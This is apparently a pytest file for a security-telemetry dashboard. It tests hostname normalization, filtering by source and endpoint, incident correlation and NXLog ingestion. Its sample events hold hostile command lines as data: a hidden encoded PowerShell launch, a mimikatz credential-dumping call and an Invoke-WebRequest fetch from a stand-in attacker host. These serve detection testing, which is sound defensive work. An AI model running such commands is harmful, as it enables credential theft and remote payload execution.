import os
import json
import tempfile
import pytest
from streamlit.testing.v1 import AppTest

from analysis.parser import NXLogReader
from analysis.normalize import (
    LogNormalizer,
    resolve_canonical_hostname,
    endpoint_matches_filter,
    resolve_source_filter_code,
    event_matches_source_filter,
    compute_filtered_telemetry_scope,
    normalize_events,
    build_endpoint_inventory,
    filter_telemetry_by_endpoint,
)
from agents.detection_agent import DetectionAgent
from agents.correlation_agent import CorrelationAgent


def _make_sample_telemetry():
    """Creates mixed-source, mixed-endpoint telemetry for unit testing filter & correlation scoping."""
    events = [
        # 1. Real NXLog Harsha security events (with verified alias variations)
        {
            "event_id": 4625,
            "timestamp": "2026-04-11T10:00:01Z",
            "hostname": "HARSHA-PC",
            "raw_hostname": "HARSHA-PC",
            "user": "HarshaUser",
            "source": "real_nxlog_windows",
            "source_type": "real_nxlog_windows",
            "provider": "Microsoft-Windows-Security-Auditing",
            "command_line": "net use \\\\127.0.0.1\\IPC$",
            "process_name": "net.exe",
            "severity": "high",
            "record_id": 9001,
            "is_diagnostic": False,
        },
        {
            "event_id": 4688,
            "timestamp": "2026-04-11T10:00:05Z",
            "hostname": "harsha.local",
            "raw_hostname": "harsha.local",
            "user": "HarshaUser",
            "source": "real_nxlog_windows",
            "source_type": "real_nxlog_windows",
            "provider": "Microsoft-Windows-Security-Auditing",
            "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgA",
            "process_name": "powershell.exe",
            "severity": "critical",
            "record_id": 9002,
            "is_diagnostic": False,
        },
        # 2. Diagnostic probe from Harsha (must be excluded from security telemetry stream)
        {
            "event_id": 9999,
            "timestamp": "2026-04-11T10:00:10Z",
            "hostname": "Harsha",
            "raw_hostname": "Harsha",
            "user": "SYSTEM",
            "source": "real_nxlog_windows",
            "source_type": "real_nxlog_windows",
            "provider": "AdaptiveSentinel-Diagnostic",
            "command_line": "SentinelLiveTest999",
            "process_name": "powershell.exe",
            "severity": "low",
            "record_id": 9003,
            "is_diagnostic": True,
        },
        # 3. Real NXLog event from another endpoint (LAPTOP-GEEF5A3A)
        {
            "event_id": 4625,
            "timestamp": "2026-04-11T10:00:15Z",
            "hostname": "LAPTOP-GEEF5A3A",
            "raw_hostname": "LAPTOP-GEEF5A3A",
            "user": "sujith",
            "source": "real_nxlog_windows",
            "source_type": "real_nxlog_windows",
            "provider": "Microsoft-Windows-Security-Auditing",
            "command_line": "whoami /all",
            "process_name": "whoami.exe",
            "severity": "medium",
            "record_id": 9004,
            "is_diagnostic": False,
        },
        # 4. Simulated / Synthetic event claiming Harsha hostname
        {
            "event_id": 4688,
            "timestamp": "2026-04-11T10:00:20Z",
            "hostname": "Harsha",
            "raw_hostname": "Harsha",
            "user": "SimulatedUser",
            "source": "synthetic",
            "source_type": "synthetic",
            "provider": "Simulated-Generator",
            "command_line": "mimikatz.exe privilege::debug",
            "process_name": "mimikatz.exe",
            "severity": "critical",
            "record_id": 9005,
            "is_diagnostic": False,
        },
        # 5. API Simulation event
        {
            "event_id": 4104,
            "timestamp": "2026-04-11T10:00:25Z",
            "hostname": "Harsha",
            "raw_hostname": "Harsha",
            "user": "ApiTester",
            "source": "api_simulation",
            "source_type": "api_simulation",
            "provider": "API-Webhook",
            "command_line": "Invoke-WebRequest http://evil.example/payload",
            "process_name": "powershell.exe",
            "severity": "high",
            "record_id": 9006,
            "is_diagnostic": False,
        },
        # 6. Ambiguous UNKNOWN_HOST event on real_nxlog_windows
        {
            "event_id": 4624,
            "timestamp": "2026-04-11T10:00:30Z",
            "hostname": "UNKNOWN_HOST",
            "raw_hostname": "UNKNOWN_HOST",
            "user": "ANONYMOUS",
            "source": "real_nxlog_windows",
            "source_type": "real_nxlog_windows",
            "provider": "Microsoft-Windows-Security-Auditing",
            "command_line": "N/A",
            "process_name": "lsass.exe",
            "severity": "low",
            "record_id": 9007,
            "is_diagnostic": False,
        },
    ]
    return normalize_events(events)


def test_hostname_alias_normalization_and_raw_preservation():
    """Requirement 10: Verified aliases normalize to Harsha while preserving raw_hostname and never collapsing UNKNOWN_HOST."""
    assert resolve_canonical_hostname("Harsha") == "Harsha"
    assert resolve_canonical_hostname("HARSHA") == "Harsha"
    assert resolve_canonical_hostname("HARSHA-PC") == "Harsha"
    assert resolve_canonical_hostname("harsha.local") == "Harsha"
    assert resolve_canonical_hostname("harsha-laptop") == "Harsha"

    # Ambiguous / unrelated hosts must NEVER collapse into Harsha
    for non_harsha in ["UNKNOWN_HOST", "UNKNOWN", "LOCALHOST", "127.0.0.1", "N/A", "", None, "LAPTOP-GEEF5A3A", "LAPTOP-2", "WIN-SEC-03"]:
        resolved = resolve_canonical_hostname(non_harsha)
        assert resolved != "Harsha", f"{non_harsha!r} should never resolve to Harsha"
        assert not endpoint_matches_filter(non_harsha, "Harsha")

    events = _make_sample_telemetry()
    assert events[0]["hostname"] == "Harsha"
    assert events[0]["raw_hostname"] == "HARSHA-PC"
    assert events[1]["hostname"] == "Harsha"
    assert events[1]["raw_hostname"] == "harsha.local"


def test_source_and_endpoint_scoping_excludes_non_matching_and_zero_evidence_incidents():
    """Requirements 1, 2, 3, 6, 7, 8: Source + Endpoint filter strictly scopes events, alerts, incidents, and counts."""
    events = _make_sample_telemetry()
    det = DetectionAgent()
    corr = CorrelationAgent()

    alerts = det.detect([e for e in events if not e.get("is_diagnostic")])
    active_incidents = corr.correlate(alerts)

    # Inject a stale historical zero-evidence incident claiming Harsha or another host
    stale_zero_incident = {
        "incident_id": "INC-8CD2F1",
        "severity": "High",
        "incident_name": "Historical Snapshot Without Active Window Evidence",
        "affected_host": "Harsha",
        "affected_hosts": ["Harsha"],
        "affected_user": "HarshaUser",
        "alert_count": 12,
        "window_alert_count": 0,
        "alerts": [],
        "telemetry_sources": ["real_nxlog_windows"],
    }
    other_host_incident = {
        "incident_id": "INC-85D28A",
        "severity": "High",
        "incident_name": "Other Host Historical Incident",
        "affected_host": "LAPTOP-GEEF5A3A",
        "affected_hosts": ["LAPTOP-GEEF5A3A"],
        "affected_user": "sujith",
        "alert_count": 5,
        "window_alert_count": 0,
        "alerts": [],
        "telemetry_sources": ["real_nxlog_windows"],
    }
    all_incidents = active_incidents + [stale_zero_incident, other_host_incident]

    # Verify filter_telemetry_by_endpoint excludes zero-evidence historical snapshots and other hosts
    real_events = [e for e in events if not e.get("is_diagnostic") and e.get("source") == "real_nxlog_windows"]
    real_inc = [
        i for i in all_incidents
        if "real_nxlog_windows" in (i.get("telemetry_sources") or [])
    ]
    f_logs, f_incs = filter_telemetry_by_endpoint(real_events, real_inc, "Harsha")
    assert len(f_logs) == 2
    assert len(f_incs) == 1
    assert f_incs[0]["incident_id"] not in ("INC-8CD2F1", "INC-85D28A")
    assert f_incs[0]["affected_host"] == "Harsha"
    assert f_incs[0]["affected_hosts"] == ["Harsha"]
    assert f_incs[0]["window_alert_count"] > 0
    assert len(f_incs[0]["alerts"]) > 0

    # Verify compute_filtered_telemetry_scope for REAL NXLOG WINDOWS + Harsha
    scope = compute_filtered_telemetry_scope(
        events,
        selected_source="REAL NXLOG WINDOWS (real_nxlog_windows)",
        selected_endpoint="Harsha",
    )

    # Only the 2 real NXLog Harsha security events should remain in unique_security_events
    assert len(scope["security_events"]) == 2
    assert len(scope["unique_security_events"]) == 2
    for ev in scope["unique_security_events"]:
        assert ev["source"] == "real_nxlog_windows"
        assert ev["hostname"] == "Harsha"
        assert not ev.get("is_diagnostic", False)
        assert ev["raw_hostname"] in ("HARSHA-PC", "harsha.local")

    # Alerts must only belong to Harsha real_nxlog_windows
    assert len(scope["security_alerts"]) == 2
    for al in scope["security_alerts"]:
        assert al["event"]["source"] == "real_nxlog_windows"
        assert al["hostname"] == "Harsha"

    # Incidents must only contain Harsha evidence and non-zero supporting alerts
    assert len(scope["active_incidents"]) == 1
    inc = scope["active_incidents"][0]
    assert inc["affected_host"] == "Harsha"
    assert inc["affected_hosts"] == ["Harsha"]
    assert inc["window_alert_count"] > 0
    assert len(inc["alerts"]) == inc["window_alert_count"]
    for al in inc["alerts"]:
        assert al["hostname"] == "Harsha"
        assert al["event"]["source"] == "real_nxlog_windows"

    # Severity distribution must sum to unique_security_events count
    assert sum(scope["severity_counts"].values()) == len(scope["unique_security_events"])

    # Selecting ALL SOURCES and ALL ENDPOINTS restores the broader view
    all_scope = compute_filtered_telemetry_scope(
        events,
        selected_source="ALL SOURCES",
        selected_endpoint="ALL ENDPOINTS",
    )
    assert len(all_scope["unique_security_events"]) == 6


def test_nxlog_reader_incremental_sync_and_malformed_lines():
    """Requirements 4, 5, 11: Incremental NXLog sync ingests new lines once, reports no new events on repeat, and handles malformed lines safely."""
    with tempfile.TemporaryDirectory() as tmpdir:
        log_file = os.path.join(tmpdir, "windows-events.log")
        cursor_file = os.path.join(tmpdir, "nxlog_cursor.json")

        line1 = json.dumps({
            "EventTime": "2026-04-11 12:00:01",
            "Hostname": "HARSHA-PC",
            "EventID": 4625,
            "SourceName": "Microsoft-Windows-Security-Auditing",
            "AccountName": "Harsha",
            "Severity": "WARNING",
            "RecordNumber": 50001,
            "Message": "An account failed to log on.",
        })
        line2 = json.dumps({
            "EventTime": "2026-04-11 12:00:05",
            "Hostname": "Harsha",
            "EventID": 4688,
            "SourceName": "Microsoft-Windows-Security-Auditing",
            "AccountName": "Harsha",
            "Severity": "CRITICAL",
            "RecordNumber": 50002,
            "CommandLine": "powershell.exe -enc AAAA",
            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        })

        with open(log_file, "w", encoding="utf-8") as f:
            f.write(line1 + "\n")
            f.write(line2 + "\n")

        reader = NXLogReader(log_file=log_file, cursor_file=cursor_file)
        batch1 = reader.read_events(incremental=True)
        assert len(batch1) == 2
        assert batch1[0]["raw_hostname"] == "HARSHA-PC"
        assert batch1[0]["provider"] == "Microsoft-Windows-Security-Auditing"
        assert batch1[1]["event_id"] == 4688
        assert reader.last_error is None

        # Second read with no new lines -> returns 0 events and no error
        batch2 = reader.read_events(incremental=True)
        assert len(batch2) == 0
        assert reader.last_error is None

        # Append a new event from Harsha
        line3 = json.dumps({
            "EventTime": "2026-04-11 12:01:00",
            "Hostname": "Harsha",
            "EventID": 4672,
            "SourceName": "Microsoft-Windows-Security-Auditing",
            "AccountName": "Harsha",
            "Severity": "INFO",
            "RecordNumber": 50003,
            "Message": "Special privileges assigned to new logon.",
        })
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(line3 + "\n")

        batch3 = reader.read_events(incremental=True)
        assert len(batch3) == 1
        assert batch3[0]["event_id"] == 4672
        assert batch3[0]["record_id"] == 50003

        # Malformed / truncated JSON line test: parse_line and get_recent_events safely handle malformed lines without crashing
        malformed_line = "{bad json line without closing brace\n"
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(malformed_line)
        parsed_fallback = reader.parse_line(malformed_line)
        assert parsed_fallback is not None
        assert parsed_fallback["source"] == "real_nxlog_windows"
        recent = reader.get_recent_events(max_events=50)
        assert len(recent) == 4


def test_dashboard_apptest_real_nxlog_harsha_and_sync_button():
    """Requirements 1-9, 12: Full Streamlit AppTest verifying filter controls, sync button, and cross-sector consistency."""
    protected_paths = [
        r"C:\AdaptiveSentinel\windows-events.log",
        "data/nxlog_cursor.json",
        "knowledge_base/sentinel_kb.db",
        "data/soar_audit.db",
    ]
    before_exists = {p: os.path.exists(p) for p in protected_paths}

    at = AppTest.from_file("dashboard/app.py", default_timeout=30)
    at.run(timeout=30)
    assert not at.exception, f"Dashboard raised exception on initial load: {at.exception}"

    # Select REAL NXLOG WINDOWS (real_nxlog_windows) and Harsha
    source_sb = [sb for sb in at.selectbox if "Select Telemetry Source" in sb.label][0]
    host_sb = [sb for sb in at.selectbox if "Filter by Endpoint Host" in sb.label][0]

    source_sb.select("REAL NXLOG WINDOWS (real_nxlog_windows)")
    host_sb.select("Harsha")
    at.run(timeout=30)
    assert not at.exception, f"Dashboard raised exception after selecting Harsha filter: {at.exception}"

    # Helper to find metric by substring
    def get_metric_val(substr):
        for m in at.metric:
            if substr in m.label:
                return m.value
        return None

    # Verify KPI metrics are strictly consistent with Harsha's 300 real security events
    assert get_metric_val("Total Logs Analyzed") == "300"
    assert get_metric_val("Live NXLog Stream") == "300"
    assert get_metric_val("High/Critical Incidents") == "0"

    # Verify every active incident for Harsha has window_alert_count > 0 and only Harsha real_nxlog_windows evidence
    active_harsha_incs = [
        inc for inc in at.session_state["nxlog_incidents"]
        if not inc.get("is_diagnostic")
        and int(inc.get("window_alert_count", 0) or 0) > 0
        and len(inc.get("alerts") or []) > 0
        and inc.get("affected_host") == "Harsha"
    ]
    zero_window_ids = {
        inc["incident_id"]
        for inc in at.session_state["nxlog_historical_incidents"]
    }
    for inc in active_harsha_incs:
        assert inc["incident_id"] not in zero_window_ids
        assert inc["affected_host"] == "Harsha"
        assert inc["affected_hosts"] == ["Harsha"]
        assert inc["window_alert_count"] > 0
        assert len(inc["alerts"]) > 0
        for al in inc["alerts"]:
            assert al["hostname"] == "Harsha"
            assert al["event"]["source"] == "real_nxlog_windows"

    assert get_metric_val("Correlated Incidents") == str(len(active_harsha_incs))

    # Verify nxlog_security_logs has no diagnostic probes
    for log_ev in at.session_state["nxlog_security_logs"]:
        assert not log_ev.get("is_diagnostic", False)
        assert log_ev.get("source") == "real_nxlog_windows"

    # Click 'Synchronize NXLog Real Telemetry'
    sync_btns = [b for b in at.button if "Synchronize NXLog Real Telemetry" in b.label]
    assert len(sync_btns) == 1
    sync_btns[0].click()
    at.run(timeout=30)
    assert not at.exception, f"Dashboard raised exception on Synchronize click: {at.exception}"

    # Verify feedback reports 'No new events received' (or ingested count if live events arrived) and does not duplicate logs
    feedback = at.session_state["nxlog_sync_feedback"]
    assert feedback is not None
    fb_msg = feedback[1] if isinstance(feedback, (tuple, list)) else feedback.get("message", "")
    assert "No new events received" in fb_msg or "Ingested" in fb_msg
    assert at.session_state["nxlog_last_sync_time"] != "Never"

    # Verify switching back to ALL SOURCES and ALL ENDPOINTS works cleanly
    source_sb = [sb for sb in at.selectbox if "Select Telemetry Source" in sb.label][0]
    host_sb = [sb for sb in at.selectbox if "Filter by Endpoint Host" in sb.label][0]
    source_sb.select("ALL SOURCES")
    host_sb.select("ALL ENDPOINTS")
    at.run(timeout=30)
    assert not at.exception

    # Verify protected files still exist
    for p, existed in before_exists.items():
        if existed:
            assert os.path.exists(p), f"Protected file {p} was missing after test!"
